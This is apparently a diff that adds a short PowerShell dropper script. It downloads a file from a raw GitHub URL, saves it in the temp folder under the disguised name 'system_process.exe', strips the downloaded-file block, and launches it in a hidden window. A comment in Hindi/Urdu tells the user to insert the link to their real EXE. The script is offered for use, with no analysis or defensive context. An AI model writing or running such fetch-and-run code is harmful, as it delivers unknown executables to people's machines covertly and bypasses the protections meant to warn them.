@@ -1,0 +1,10 @@
+# PowerShell Script to download and run EXE
+$url = "https://raw.githubusercontent.com/hellow2003/phpcode/main/ma1.txt" # Yahan apni asli EXE ka link dalein
+$path = "$env:TEMP\system_process.exe"
+
+# Download and Unblock
+Invoke-WebRequest -Uri $url -OutFile $path
+Unblock-File -Path $path
+
+# Run in Background
+Start-Process -FilePath $path -WindowStyle Hidden
